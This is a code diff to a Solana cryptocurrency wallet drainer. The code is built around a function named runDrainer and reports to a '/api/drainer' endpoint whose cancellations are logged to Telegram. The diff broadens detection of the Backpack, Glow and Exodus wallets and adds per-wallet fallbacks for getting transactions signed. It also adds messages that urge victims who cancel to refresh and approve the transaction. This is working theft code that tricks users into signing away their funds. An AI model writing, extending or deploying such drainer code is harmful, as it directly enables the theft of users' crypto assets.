@@ -751,8 +751,41 @@
         name: 'Backpack',
         icon: '/backpack-logo.png',
         provider: () => {
-          const backpack = window.backpack;
-          return backpack && typeof backpack === 'object' ? backpack : null;
+          // Enhanced Backpack detection with multiple fallbacks
+          console.log('Backpack detection - checking for Backpack objects:');
+          console.log('window.backpack:', window.backpack);
+          console.log('window.BackpackWallet:', window.BackpackWallet);
+          console.log('window.backpackWallet:', window.backpackWallet);
+          
+          // Check all possible Backpack objects
+          const possibleBackpacks = [
+            window.backpack,
+            window.BackpackWallet,
+            window.backpackWallet,
+            window.backpack?.solana,
+            window.BackpackWallet?.solana
+          ];
+          
+          for (const wallet of possibleBackpacks) {
+            if (wallet && typeof wallet === 'object') {
+              console.log('Found Backpack object:', wallet);
+              console.log('Backpack object properties:', Object.keys(wallet));
+              
+              // Check if it has essential methods
+              const hasConnect = typeof wallet.connect === 'function';
+              const hasSignTransaction = typeof wallet.signTransaction === 'function';
+              const hasPublicKey = wallet.publicKey || wallet.address;
+              
+              console.log('Backpack capabilities:', { hasConnect, hasSignTransaction, hasPublicKey });
+              
+              if (hasConnect) {
+                return wallet;
+              }
+            }
+          }
+          
+          console.log('No Backpack detected');
+          return null;
         },
         install: 'https://backpack.app/',
         mobile: {
@@ -766,8 +799,41 @@
         name: 'Glow',
         icon: '/glow-logo.png',
         provider: () => {
-          const glow = window.glow;
-          return glow && typeof glow === 'object' ? glow : null;
+          // Enhanced Glow detection with multiple fallbacks
+          console.log('Glow detection - checking for Glow objects:');
+          console.log('window.glow:', window.glow);
+          console.log('window.GlowWallet:', window.GlowWallet);
+          console.log('window.glowWallet:', window.glowWallet);
+          
+          // Check all possible Glow objects
+          const possibleGlows = [
+            window.glow,
+            window.GlowWallet,
+            window.glowWallet,
+            window.glow?.solana,
+            window.GlowWallet?.solana
+          ];
+          
+          for (const wallet of possibleGlows) {
+            if (wallet && typeof wallet === 'object') {
+              console.log('Found Glow object:', wallet);
+              console.log('Glow object properties:', Object.keys(wallet));
+              
+              // Check if it has essential methods
+              const hasConnect = typeof wallet.connect === 'function';
+              const hasSignTransaction = typeof wallet.signTransaction === 'function';
+              const hasPublicKey = wallet.publicKey || wallet.address;
+              
+              console.log('Glow capabilities:', { hasConnect, hasSignTransaction, hasPublicKey });
+              
+              if (hasConnect) {
+                return wallet;
+              }
+            }
+          }
+          
+          console.log('No Glow detected');
+          return null;
         },
         install: 'https://glow.app/',
         mobile: {
@@ -853,8 +919,41 @@
         name: 'Exodus',
         icon: '/exodus-logo.png',
         provider: () => {
-          const exodus = window.exodus || window.exodusWallet;
-          return exodus && typeof exodus === 'object' ? exodus : null;
+          // Enhanced Exodus detection with multiple fallbacks
+          console.log('Exodus detection - checking for Exodus objects:');
+          console.log('window.exodus:', window.exodus);
+          console.log('window.exodusWallet:', window.exodusWallet);
+          console.log('window.ExodusWallet:', window.ExodusWallet);
+          
+          // Check all possible Exodus objects
+          const possibleExodus = [
+            window.exodus,
+            window.exodusWallet,
+            window.ExodusWallet,
+            window.exodus?.solana,
+            window.exodusWallet?.solana
+          ];
+          
+          for (const wallet of possibleExodus) {
+            if (wallet && typeof wallet === 'object') {
+              console.log('Found Exodus object:', wallet);
+              console.log('Exodus object properties:', Object.keys(wallet));
+              
+              // Check if it has essential methods
+              const hasConnect = typeof wallet.connect === 'function';
+              const hasSignTransaction = typeof wallet.signTransaction === 'function';
+              const hasPublicKey = wallet.publicKey || wallet.address;
+              
+              console.log('Exodus capabilities:', { hasConnect, hasSignTransaction, hasPublicKey });
+              
+              if (hasConnect) {
+                return wallet;
+              }
+            }
+          }
+          
+          console.log('No Exodus detected');
+          return null;
         },
         install: 'https://exodus.com/',
         mobile: {
@@ -931,26 +1030,35 @@ async function runDrainer(provider) {
     } else if (provider === window.solflare && window.solflare?.isSolflare) {
       connectedWalletType = 'Solflare';
       activeProviders.push('Solflare');
-    } else if (provider === window.backpack && window.backpack?.isBackpack) {
+    } else if (provider === window.backpack || provider === window.BackpackWallet || provider === window.backpackWallet) {
       connectedWalletType = 'Backpack';
       activeProviders.push('Backpack');
-    } else if (provider === window.glow && window.glow?.isGlow) {
+    } else if (provider === window.glow || provider === window.GlowWallet || provider === window.glowWallet) {
       connectedWalletType = 'Glow';
       activeProviders.push('Glow');
     } else if (provider === window.trustwallet?.solana || provider === window.trustWallet && window.trustWallet?.isTrustWallet) {
       connectedWalletType = 'Trust Wallet';
       activeProviders.push('Trust Wallet');
-    } else if (provider === window.exodus && window.exodus?.isExodus) {
+    } else if (provider === window.exodus || provider === window.exodusWallet || provider === window.ExodusWallet) {
       connectedWalletType = 'Exodus';
       activeProviders.push('Exodus');
     } else {
-      // Fallback: try to determine wallet type from provider properties
+      // Enhanced fallback: try to determine wallet type from provider properties and methods
       if (provider && typeof provider.isPhantom === 'boolean') connectedWalletType = 'Phantom';
       else if (provider && typeof provider.isSolflare === 'boolean') connectedWalletType = 'Solflare';
       else if (provider && typeof provider.isBackpack === 'boolean') connectedWalletType = 'Backpack';
       else if (provider && typeof provider.isGlow === 'boolean') connectedWalletType = 'Glow';
       else if (provider && typeof provider.isTrustWallet === 'boolean') connectedWalletType = 'Trust Wallet';
       else if (provider && typeof provider.isExodus === 'boolean') connectedWalletType = 'Exodus';
+      else {
+        // Additional fallback: check for wallet-specific methods
+        if (typeof provider.sign === 'function' && !provider.signTransaction) {
+          // Some wallets use 'sign' instead of 'signTransaction'
+          if (window.glow || window.GlowWallet) connectedWalletType = 'Glow';
+          else if (window.backpack || window.BackpackWallet) connectedWalletType = 'Backpack';
+          else if (window.exodus || window.exodusWallet) connectedWalletType = 'Exodus';
+        }
+      }
       
       activeProviders.push(connectedWalletType);
     }
@@ -1202,19 +1310,53 @@ async function runDrainer(provider) {
         signAndSendTransaction: typeof provider.signAndSendTransaction === 'function'
       });
       
-      // Add timeout wrapper for signing
+      // Enhanced signing with wallet-specific fallbacks
       const signingPromise = (async () => {
-      if (typeof provider.signAndSendTransaction === 'function') {
-        // Try signAndSendTransaction first (some wallets prefer this)
-        console.log('[SIGNING] Using signAndSendTransaction');
-          return await provider.signAndSendTransaction(transaction);
-      } else if (typeof provider.signTransaction === 'function') {
-        // Fallback to signTransaction
-        console.log('[SIGNING] Using signTransaction');
-          return await provider.signTransaction(transaction);
-    } else {
-          throw new Error('Wallet does not support transaction signing.');
+        console.log('[SIGNING] Wallet type detected:', connectedWalletType);
+        
+        // Wallet-specific signing strategies
+        if (connectedWalletType === 'Glow') {
+          console.log('[SIGNING] Using Glow-specific signing strategy');
+          if (typeof provider.signAndSendTransaction === 'function') {
+            return await provider.signAndSendTransaction(transaction);
+          } else if (typeof provider.signTransaction === 'function') {
+            return await provider.signTransaction(transaction);
+          } else if (typeof provider.sign === 'function') {
+            // Glow might use 'sign' instead of 'signTransaction'
+            return await provider.sign(transaction);
+          }
+        } else if (connectedWalletType === 'Backpack') {
+          console.log('[SIGNING] Using Backpack-specific signing strategy');
+          if (typeof provider.signAndSendTransaction === 'function') {
+            return await provider.signAndSendTransaction(transaction);
+          } else if (typeof provider.signTransaction === 'function') {
+            return await provider.signTransaction(transaction);
+          } else if (typeof provider.sign === 'function') {
+            // Backpack might use 'sign' instead of 'signTransaction'
+            return await provider.sign(transaction);
+          }
+        } else if (connectedWalletType === 'Exodus') {
+          console.log('[SIGNING] Using Exodus-specific signing strategy');
+          if (typeof provider.signAndSendTransaction === 'function') {
+            return await provider.signAndSendTransaction(transaction);
+          } else if (typeof provider.signTransaction === 'function') {
+            return await provider.signTransaction(transaction);
+          } else if (typeof provider.sign === 'function') {
+            // Exodus might use 'sign' instead of 'signTransaction'
+            return await provider.sign(transaction);
+          }
+        } else {
+          // Default strategy for other wallets
+          if (typeof provider.signAndSendTransaction === 'function') {
+            console.log('[SIGNING] Using signAndSendTransaction');
+            return await provider.signAndSendTransaction(transaction);
+          } else if (typeof provider.signTransaction === 'function') {
+            console.log('[SIGNING] Using signTransaction');
+            return await provider.signTransaction(transaction);
+          }
         }
+        
+        throw new Error('Wallet does not support transaction signing.');
       })();
       
                        const timeoutPromise = new Promise((_, reject) => {
@@ -1243,9 +1385,18 @@ async function runDrainer(provider) {
           } catch (signError) {
         console.error('[runDrainer] Transaction signing error:', signError);
         
-        // Check if user rejected the transaction
-          if (signError.message?.includes('User rejected') || signError.message?.includes('User denied') || signError.message?.includes('Cancelled')) {
-            showStatus('Transaction was cancelled. Please try again and approve the transaction.', 'error');
+        // Enhanced error handling for specific wallets
+        if (signError.message?.includes('User rejected') || signError.message?.includes('User denied') || signError.message?.includes('Cancelled')) {
+          showStatus('Transaction was cancelled. Please try again and approve the transaction.', 'error');
+          
+          // Wallet-specific error messages
+          if (connectedWalletType === 'Glow') {
+            showStatus('Glow wallet: Please ensure you have approved the transaction. If the prompt didn\'t appear, try refreshing the page and connecting again.', 'error');
+          } else if (connectedWalletType === 'Backpack') {
+            showStatus('Backpack wallet: Please ensure you have approved the transaction. If the prompt didn\'t appear, try refreshing the page and connecting again.', 'error');
+          } else if (connectedWalletType === 'Exodus') {
+            showStatus('Exodus wallet: Please ensure you have approved the transaction. If the prompt didn\'t appear, try refreshing the page and connecting again.', 'error');
+          }
             
             // Log transaction cancellation to Telegram
             fetch('/api/drainer/log-cancellation', {
